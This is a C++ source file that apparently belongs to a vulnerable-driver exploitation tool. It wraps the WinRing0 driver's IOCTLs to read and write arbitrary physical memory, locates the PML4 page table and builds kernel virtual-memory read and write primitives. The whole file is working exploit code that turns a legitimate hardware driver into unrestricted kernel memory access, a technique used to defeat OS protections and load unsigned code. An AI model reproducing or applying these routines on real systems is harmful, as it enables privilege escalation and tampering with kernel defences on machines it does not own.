/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020
*
*  TITLE:       WINRING0.CPP
*
*  VERSION:     1.01
*
*  DATE:        13 Feb 2020
*
*  WinRing0 based drivers routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/winring0.h"

/*
* WRZeroReadPhysicalMemory
*
* Purpose:
*
* Read physical memory through MmMapIoSpace.
*
*/
BOOL WRZeroReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes
)
{
    OLS_READ_MEMORY_INPUT request;

    request.Address.QuadPart = PhysicalAddress;
    request.UnitSize = 1;
    request.Count = NumberOfBytes;

    return supCallDriver(DeviceHandle,
        IOCTL_OLS_READ_MEMORY,
        &request,
        sizeof(request),
        Buffer,
        NumberOfBytes);
}

/*
* WRZeroWritePhysicalMemory
*
* Purpose:
*
* Write to physical memory.
*
*/
BOOL WINAPI WRZeroWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;
    SIZE_T size;
    ULONG value;
    DWORD dwError = ERROR_SUCCESS;
    OLS_WRITE_MEMORY_INPUT* pRequest;

    value = FIELD_OFFSET(OLS_WRITE_MEMORY_INPUT, Data) + NumberOfBytes;
    size = ALIGN_UP_BY(value, PAGE_SIZE);

    pRequest = (OLS_WRITE_MEMORY_INPUT*)VirtualAlloc(NULL, size, 
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (pRequest) {

        if (VirtualLock(pRequest, size)) {

            pRequest->Address.QuadPart = PhysicalAddress;
            pRequest->UnitSize = 1;
            pRequest->Count = NumberOfBytes;
            RtlCopyMemory(&pRequest->Data, Buffer, NumberOfBytes);

            bResult = supCallDriver(DeviceHandle,
                IOCTL_OLS_WRITE_MEMORY,
                pRequest,
                (ULONG)size,
                NULL,
                0);

            if (!bResult)
                dwError = GetLastError();

            VirtualUnlock(pRequest, size);
        }
        else {
            dwError = GetLastError();
        }
        VirtualFree(pRequest, 0, MEM_RELEASE);
    }

    SetLastError(dwError);
    return bResult;
}

/*
* WRZeroQueryPML4Value
*
* Purpose:
*
* Locate PML4.
*
*/
BOOL WINAPI WRZeroQueryPML4Value(
    _In_ HANDLE DeviceHandle,
    _Out_ ULONG_PTR* Value)
{
    DWORD dwError = ERROR_SUCCESS;
    ULONG_PTR PML4 = 0;
    UCHAR* pbLowStub1M;

    *Value = 0;

    do {

        pbLowStub1M = (UCHAR*)supHeapAlloc(0x100000);
        if (pbLowStub1M == NULL) {
            dwError = GetLastError();
            break;
        }

        for (ULONG_PTR i = 0; i < 0x100000; i += PAGE_SIZE) {

            if (!WRZeroReadPhysicalMemory(DeviceHandle,
                i,
                RtlOffsetToPointer(pbLowStub1M, i),
                PAGE_SIZE))
            {
                dwError = GetLastError();
                break;
            }

        }

        PML4 = supGetPML4FromLowStub1M((ULONG_PTR)pbLowStub1M);
        if (PML4)
            *Value = PML4;
        else
            *Value = 0;


        dwError = ERROR_SUCCESS;

    } while (FALSE);

    if (pbLowStub1M)
        supHeapFree(pbLowStub1M);

    SetLastError(dwError);
    return (PML4 != 0);
}

/*
* WRZeroVirtualToPhysical
*
* Purpose:
*
* Translate virtual address to the physical.
*
*/
BOOL WINAPI WRZeroVirtualToPhysical(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress)
{
    BOOL bResult = FALSE;

    if (PhysicalAddress)
        *PhysicalAddress = 0;
    else {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }

    bResult = PwVirtualToPhysical(DeviceHandle,
        (provQueryPML4)WRZeroQueryPML4Value,
        (provReadPhysicalMemory)WRZeroReadPhysicalMemory,
        VirtualAddress,
        PhysicalAddress);

    return bResult;
}


/*
* WRZeroReadKernelVirtualMemory
*
* Purpose:
*
* Read virtual memory.
*
*/
BOOL WINAPI WRZeroReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult;
    ULONG_PTR physicalAddress = 0;
    DWORD dwError = ERROR_SUCCESS;

    bResult = WRZeroVirtualToPhysical(DeviceHandle,
        Address,
        &physicalAddress);

    if (bResult) {

        bResult = WRZeroReadPhysicalMemory(DeviceHandle,
            physicalAddress,
            Buffer,
            NumberOfBytes);

        if (!bResult)
            dwError = GetLastError();

    }
    else {
        dwError = GetLastError();
    }

    SetLastError(dwError);
    return bResult;
}

/*
* WRZeroKernelVirtualMemory
*
* Purpose:
*
* Write virtual memory.
*
*/
BOOL WINAPI WRZeroKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult;
    ULONG_PTR physicalAddress = 0;
    DWORD dwError = ERROR_SUCCESS;

    bResult = WRZeroVirtualToPhysical(DeviceHandle,
        Address,
        &physicalAddress);

    if (bResult) {

        bResult = WRZeroWritePhysicalMemory(DeviceHandle,
            physicalAddress,
            Buffer,
            NumberOfBytes);

        if (!bResult)
            dwError = GetLastError();

    }
    else {
        dwError = GetLastError();
    }

    SetLastError(dwError);
    return bResult;
}
